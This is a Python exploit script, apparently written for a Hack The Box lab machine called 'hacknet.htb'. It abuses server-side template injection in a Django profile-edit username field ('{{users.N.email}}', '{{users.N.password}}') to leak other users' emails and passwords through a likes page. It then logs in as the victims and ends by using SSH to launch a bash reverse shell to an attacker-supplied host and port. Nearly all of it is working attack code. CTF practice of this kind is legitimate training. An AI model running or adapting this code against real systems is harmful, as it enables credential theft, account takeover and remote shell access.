#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup
import re
import paramiko

if len(sys.argv) < 6:
    print("[*] Usage: python3 ", sys.argv[0], " <target> <username> <password> <lhost> <lport>")
    sys.exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
lhost = sys.argv[4]
lport = sys.argv[5]
proxies = {'http':'http://127.0.0.1:8081'}


def get_csrf_token():
    r = requests.get(url + '/register', proxies=proxies)
    header_cookies = r.headers.get('Set-Cookie').split('=')[1].split(';')[0]
    soup = BeautifulSoup(r.text, "html.parser")
    token  = soup.find("input", {"name":"csrfmiddlewaretoken"})['value']
    if token and header_cookies:
        return token, header_cookies
    else:
        print("[-] Could not get CSRF token")



def register():
    token, cookies = get_csrf_token()
    data = {
        'csrfmiddlewaretoken':token,
        'email':f'{username}@hacknet.htb',
        'username':f'{username}',
        'password':f'{password}'
    }
    header = {
        'User-Agent':'python-requests/2.32.5',
        'Cookie':f'csrftoken={cookies}'
    }
    print("[*] Creating User")
    r  = requests.post(url + '/register', data=data, headers=header,proxies=proxies)
    if r.status_code == 200:
        print("[*] user created")
    else:
        print("[-] An error has occured")
        sys.exit()


def login():
    token, cookies = get_csrf_token()
    s = requests.Session()
    header = {
        'User-Agent':'python-requests/2.32.5',
        'Cookie':f'csrftoken={cookies}'
    }
    data = {
        'csrfmiddlewaretoken':token,
        'email':f'{username}@hacknet.htb',
        'password':f'{password}'
    }
    print("[*] Logging in")
    r = s.post(url + '/login', data=data, headers=header, proxies=proxies)
    

    return s


def pwn():
    s = login()
    token, cookies = get_csrf_token()
    r = s.get(url + '/profile', proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token_profile = soup.find("input", {"name":"csrfmiddlewaretoken"})['value']
    form_data = {
        'csrfmiddlewaretoken':(None, f'{token_profile}'),
        'Picture':(None, ''),
        'email':(None, ''),
        'username':(None, '{{users.15.email}}'),
        'password':(None, ''),
        'about':(None, ''),
        'is_public':(None, 'on')
    }

    print("[*] Injecting Payload")
    profile_update_email = s.post(url + '/profile/edit', data=form_data, proxies=proxies)
    post_like = s.get(url + '/like/15')
    post_like_users = s.get(url + '/likes/15')
    soup_email = BeautifulSoup(post_like_users.text, "html.parser")
    emails = soup_email.find_all("img", title=True)
    email_id = None
    for email in emails:
        if 'hacknet.htb' in email['title']:
            email_id  = email['title']
            break

    if email_id:
        print("[*] Found email for deepdive: ", email_id)
    else:
        print("[-] Could not get email_id")
        sys.exit()

    form_data_deepdive = {
        'csrfmiddlewaretoken':(None, f'{token_profile}'),
        'Picture':(None, ''),
        'email':(None, ''),
        'username':(None, '{{users.15.password}}'),
        'password':(None, ''),
        'about':(None, ''),
        'is_public':(None, 'on')
    }



    profile_update_password = s.post(url + '/profile/edit', data=form_data_deepdive, proxies=proxies)
    post_like_password = s.get(url + '/likes/15')
    soup_password = BeautifulSoup(post_like_password.text, "html.parser")
    passwords = soup_password.find_all("img", title=True)
    password = None
    for p in passwords:
        if 'D' in p['title']:
            password = p['title']
            break

    if password:
        print("[*] Found password for deepdive: ", password)
    else:
        print("[-] Could not return password")
        sys.exit()

    print("[*] Adding deepdive to contacts")
    send_friend = s.get(url + '/contacts?action=request&userId=22')
    s1 = requests.Session()

    header = {
        'User-Agent':'python-requests/2.32.5',
        'Cookie':f'csrftoken={cookies}'
    }
    data = {
        'csrfmiddlewaretoken':token,
        'email':f'{email_id}',
        'password':f'{password}'
    }


    deepdive_login = s1.post(url + '/login', data=data, headers=header, proxies=proxies)
    print("[*] Extracting user ID")
    r4 = s.get(url + '/search?page=2')
    soup_profile_id = BeautifulSoup(r4.text, "html.parser")
    for a in soup_profile_id.select('a.single-user'):
        h3 = a.find("h3")
        if not h3:
            continue
        if h3.get_text(strip=True) == username:
            href = a.get("href", "")
            m = re.search(r"/profile/(\d+)", href)
            if m:
                print("[*] Found User ID", m)
                id = int(m.group(1))
                deepdive_accept_friend_req = s1.get(url + f'/contacts?action=accept&userId={id}', proxies=proxies)
                break


   #deepdive_accept_friend_req = s1.get(url + f'/contacts?action=accept&userId={id}')



    form_data_bandit_email = {
        'csrfmiddlewaretoken':(None, f'{token_profile}'),
        'Picture':(None, ''),
        'email':(None, ''),
        'username':(None, '{{users.0.email}}'),
        'password':(None, ''),
        'about':(None, ''),
        'is_public':(None, 'on')
    }


    profile_update_email_bandit = s.post(url + '/profile/edit', data=form_data_bandit_email, proxies=proxies)
    post_like_bandit = s.get(url + '/like/23', proxies=proxies)
    post_like_users_bandit = s.get(url + '/likes/23', proxies=proxies)
    soup_email_bandit = BeautifulSoup(post_like_users_bandit.text, "html.parser")
    emails_bandit = soup_email_bandit.find_all("img", title=True)
    email_id_bandit = None
    for email_bandit in emails_bandit:
        if 'hacknet.htb' in email_bandit['title']:
            email_id_bandit  = email_bandit['title']
            break
    if email_id_bandit:
        print("[*] Found email for backdoor_bandit: ", email_id_bandit)
    else:
        print("[-] Could not find email for root_bandit")
        sys.exit()


    form_data_bandit_password = {
        'csrfmiddlewaretoken':(None, f'{token_profile}'),
        'Picture':(None, ''),
        'email':(None, ''),
        'username':(None, '{{users.0.password}}'),
        'password':(None, ''),
        'about':(None, ''),
        'is_public':(None, 'on')
    }

    profile_update_password_bandit = s.post(url + '/profile/edit', data=form_data_bandit_password, proxies=proxies)
    #post_like_bandit_password = s.get(url + '/like/23')
    post_like_users_bandit_password = s.get(url + '/likes/23', proxies=proxies)
    soup_password_bandit = BeautifulSoup(post_like_users_bandit_password.text, "html.parser")
    passwords_bandit = soup_password_bandit.find_all("img", title=True)
    password_bandit = None
    for pass_bandit in passwords_bandit:
        if 'd4' in pass_bandit['title']:
            password_bandit  = pass_bandit['title']
            break
    if password_bandit:
        print("[*] Found password for backdoor_bandit: ", password_bandit)
    else:
        print("[-] Could not find password for backdoor_bandit")
        sys.exit()

    try :
        print("[*] Spawning Shell")
        ssh_username = email_id_bandit.split('@')[0]
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('hacknet.htb', username=f'{ssh_username}', password=f'{password_bandit}')
        client.exec_command(f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"')
    except Exception as e:
        print("[-] An error has occured: ", e)
    
register()    
pwn()
